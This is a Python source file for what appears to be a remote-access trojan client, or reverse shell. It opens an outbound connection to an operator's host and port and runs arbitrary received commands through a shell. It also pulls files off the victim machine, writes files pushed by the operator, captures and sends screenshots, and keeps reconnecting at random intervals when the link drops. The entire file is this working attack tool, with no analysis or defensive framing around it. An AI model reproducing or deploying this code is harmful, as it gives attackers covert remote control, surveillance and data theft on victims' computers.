import sys
import socket
import subprocess
import os
import base64
import time
import random
import shutil
import tempfile
import pyscreenshot

RECV_BYTE = 1024


def b64e(x):
    return base64.b64encode(x)

    
def send_file(s, file_path):
    if os.path.isfile(file_path):
        f = open(file_path, 'rb')

        while True:
            packet = f.read(RECV_BYTE)
            if packet == '':
                break
            s.send(packet)

        s.send(b64e('REMOTE_FILE_DOWNLOAD_DONE'))
        f.close()
    elif os.path.isdir(file_path):
        s.send(b64e('REMOTE_FILE_IS_A_DIRECTORY'))
    else:
        s.send(b64e('REMOTE_FILE_NOT_EXIST'))


def receive_file(s, file_path):
    if os.path.exists(file_path):
        s.send(b64e('REMOTE_FILE_ALREADY_EXISTS'))

    if not os.path.exists(os.path.dirname(file_path)):
        os.makedirs(os.path.dirname(file_path))

    s.send(b64e('REMOTE_FILE_UPLOAD_START'))

    transfer_done_token = b64e('LOCAL_FILE_UPLOAD_DONE')
    f = open(file_path, 'wb')
    while True:
        packet = s.recv(RECV_BYTE)
        if packet.endswith(transfer_done_token):
            break
        f.write(packet)

    # final data
    f.write(packet.split(transfer_done_token, 1)[0])
    f.close()


def screen_capture(s):
    temp_path = tempfile.mkdtemp()
    img_path = temp_path + '/img.jpg'
    pyscreenshot.grab().save(img_path, 'JPEG')
    send_file(s, img_path)
    shutil.rmtree(temp_path)


def change_working_directory(s, path):
    if os.path.isdir(path):
        os.chdir(path)
        ret_str = '[*] CWD is ' + os.getcwd()
    elif path == '':
        ret_str = '[*] CWD is ' + os.getcwd()
    else:
        ret_str = '[!] %s is not a directory'

    s.send(ret_str)


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[0], int(sys.argv[1])))

    while True:
        command = s.recv(RECV_BYTE)
        command_split = command.split(' ', 1)
        action = command_split[0].lower()
        if len(command_split) == 2:
            args = command_split[1]
        else:
            args = ''

        if 'exit' in action:
            s.close()
            break
        elif 'download' in action:
            send_file(s, args)
        elif 'upload' in action:
            receive_file(s, args)
        elif 'screencap' in action:
            screen_capture(s)
        elif 'cd' in action:
            change_working_directory(s, args)
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())

    return False


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: Basic_Client.py <host> <port>'
        return

    sys.argv = sys.argv[1:]
    while True:
        try:
            if not connect():
                break
        except:
            sleep_time = random.randrange(1, 10)
            time.sleep(sleep_time)
            pass


main()
